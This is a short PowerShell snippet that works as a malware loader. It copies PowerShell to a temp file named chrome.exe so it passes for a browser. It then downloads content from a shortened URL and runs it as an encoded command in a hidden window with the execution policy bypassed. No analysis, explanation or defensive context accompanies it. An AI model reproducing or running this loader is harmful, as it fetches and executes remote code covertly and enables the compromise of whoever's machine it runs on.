$f=c:\windows\temp\chrome.exe;
copy (Get-Process powershell | select -First 1).Path -Dest $f;
$e=(New-Object System.Net.WebClient).DownloadString(\"http://v.ht/RI3n\");
$f –Exec bypass -w hidden -e $e